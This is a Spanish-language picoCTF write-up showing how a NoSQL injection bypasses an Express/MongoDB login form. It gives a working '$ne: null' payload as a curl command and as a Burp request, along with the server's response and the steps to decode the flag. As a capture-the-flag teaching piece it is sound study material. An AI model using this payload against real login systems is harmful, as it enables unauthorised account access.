# Writeup: No_Sql_Injection
**Categoría:** Medium
**Fecha de conversión:** 2026-04-24

---

Write-up: Inyección NoSQL en el login (picoCTF)

Descripción del desafío


Se nos proporciona una aplicación web con un formulario de login. El código fuente (server.js) muestra que el backend está escrito en Node.js con Express y MongoDB (usando mongodb-memory-server para pruebas). Existe una vulnerabilidad de inyección NoSQL que permite omitir la autenticación y obtener la flag.

### Análisis del código vulnerable


En el archivo server.js, la ruta /login recibe un JSON con email y password. Antes de usarlos en la consulta a MongoDB, se aplica la siguiente lógica:

javascript


const user = await User.findOne({

```
  email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,
  password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : password,
```

});


Si el valor enviado comienza y termina con llaves {}, se interpreta como JSON. Esto permite inyectar operadores de MongoDB, como $ne (not equal), para modificar la consulta.

¿Por qué funciona la inyección?


MongoDB permite usar operadores de comparación en las consultas. Por ejemplo, { "$ne": null } significa "campo distinto de null". Si enviamos:

json


{ "email": { "$ne": null }, "password": { "$ne": null } }


La consulta equivalente sería: buscar un usuario cuyo email no sea null y cuya contraseña no sea null. Como todos los documentos tienen esos campos, la base de datos devuelve el primer usuario (en este caso, el único creado al inicio).


La aplicación espera un JSON en el cuerpo, pero nosotros estamos inyectando otro JSON dentro del campo email y password. Al hacer JSON.parse(email), el string '{"$ne": null}' se convierte en el objeto { $ne: null }, que es un operador válido de MongoDB.

¿Por qué usar curl o Burp Suite?


Aunque el formulario web envía datos en JSON mediante fetch, el campo de texto del formulario está limitado a caracteres típicos. Podríamos intentar escribir {"$ne": null} directamente en el campo de email, pero:


```
    El navegador podría codificar las llaves o las comillas.

    La aplicación podría tener validaciones del lado del cliente (aunque aquí no las tiene).

    Para mayor control y evitar problemas con caracteres especiales, las herramientas como curl o Burp Suite permiten enviar el payload exacto sin modificaciones.

```

Además, curl nos permite ver la respuesta completa y automatizar el proceso.

Explotación paso a paso


```
    Ejecutamos el servidor localmente (o conectamos a la instancia remota). En este caso, la URL remota es http://atlas.picoctf.net:61501.

    Usamos curl para enviar una petición POST con el payload malicioso:

```

bash


curl -X POST http://atlas.picoctf.net:61501/login \

```
  -H "Content-Type: application/json" \
  -d '{"email": "{\"$ne\": null}", "password": "{\"$ne\": null}"}'

```

### Explicación del payload:


```
    El -d contiene un objeto JSON con dos campos: email y password.

    Cada campo es un string que empieza y termina con llaves: "{\"$ne\": null}".

    Al llegar al servidor, como el string comienza con { y termina con }, se parsea a { $ne: null }.

    La consulta final en MongoDB es User.findOne({ email: { $ne: null }, password: { $ne: null } }), que devuelve el primer usuario.

    El servidor responde con un JSON que incluye la flag en el campo token:

```

json


{"success":true,"email":"picoplayer355@picoctf.org","token":"cGljb0NUR****************************WxfaW5qZWN0aW9uXzY3YjFhM2M4fQ==","firstName":"pico","lastName":"player"}


```
    El token está codificado en Base64. Lo decodificamos con:

```

bash


echo "cGljb0NUR**************************************WxfaW5qZWN0aW9uXzY3YjFhM2M4fQ==" | base64 -d


Obtenemos la **flag**:

text


picoCTF{*******************************}


Conclusión


La vulnerabilidad de inyección NoSQL ocurre porque el servidor confía en la entrada del usuario y la interpreta como JSON, permitiendo el uso de operadores de MongoDB. Para explotarla es necesario enviar el payload de forma precisa, lo que se logra fácilmente con curl o un proxy como Burp Suite. La flag obtenida confirma el acceso no autorizado.


En burpsuit interceptamos la request con kr3s4l4@picoctf.es:pass y la modificamos


Request


POST /login HTTP/1.1

Host: atlas.picoctf.net:59912

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: http://atlas.picoctf.net:59912/

Content-Type: application/json

Content-Length: 59

Origin: http://atlas.picoctf.net:59912

Connection: keep-alive

Priority: u=0


{"email": "{\"$ne\": null}", "password": "{\"$ne\": null}"}


Response


## Http/1.1 200 ok

X-Powered-By: Express

Content-Type: application/json; charset=utf-8

Content-Length: 186

ETag: W/"ba-7/pkE41Bq9cbRmeDm6aZ+wsgexM"

Date: Thu, 23 Apr 2026 18:04:34 GMT

Connection: keep-alive

Keep-Alive: timeout=5


{"success":true,"email":"picoplayer355@picoctf.org","token":"cGljb0NUR*******************************W9uXzY3YjFhM2M4fQ==","firstName":"pico","lastName":"player"

